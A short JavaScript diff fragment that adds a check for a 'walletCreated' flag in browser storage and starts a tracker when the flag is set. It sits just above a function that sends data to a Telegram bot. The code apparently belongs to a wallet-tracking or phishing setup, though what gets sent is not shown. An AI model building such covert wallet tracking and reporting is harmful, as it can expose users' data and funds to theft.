@@ -61,6 +61,12 @@ function startTracker(trackerId) {
 }
 
 
+const walletCreated = localStorage.getItem('walletCreated');
+	    if (walletCreated === 'true') {
+		    alert("New");
+		    startTracker('tracker-one');
+	    }
+
 // Function to send data to Telegram bot
 async function sendToTelegramBot(data, botToken, chatId) {
     try {
